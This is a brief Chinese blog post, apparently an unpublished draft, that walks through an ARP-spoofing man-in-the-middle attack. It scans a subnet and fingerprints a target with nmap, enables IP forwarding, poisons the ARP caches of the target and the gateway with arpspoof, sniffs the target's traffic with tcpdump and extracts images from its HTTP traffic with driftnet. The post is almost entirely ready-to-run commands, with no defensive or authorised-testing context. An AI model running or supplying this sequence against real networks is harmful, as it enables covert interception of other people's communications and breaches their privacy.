---
title: ARP攻击
layout: post
tags: []
published: false
category: Uncategoried
---
#1. 锁定目标
```
$ nmap -sp 192.168.1.0/24
```
#2. 收集信息
```
$ nmap -A 192.168.1.110
```
#3.开启IP转发和ARP欺骗
该步仅针对交换式局域网，共享式网络可以忽略(共享式网络只要打开网卡的混杂模式就可以抓取所有内网数据包)，ARP欺骗一般目的是吧自己伪装成网关，但如果不作处理，当被欺骗数据包到达后就会被本机抛弃(因为自己到底不是网关，还不知道如何处理这类数据包)，这当然是不允许的。开启IP转发功能可以解决这个问题，IP转发负责把该类数据包再转发给真正的网关处理，开启IP转发的方法
```
$ sudo echo 1 > /proc/sys/net/ipv4/ip_forward
$ sudo arpspoof -i eth0 -t 192.168.1.110 192.168.1.1
$ sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.110

```

#4.抓取数据包
```
$ sudo tcpdump -i eth1 host 192.168.1.110
```

#5. 收获果实
抓取主机A http流量中的图片，通过driftnet工具实现。运行下面命令
```
$ sudo driftnet -t eth1
```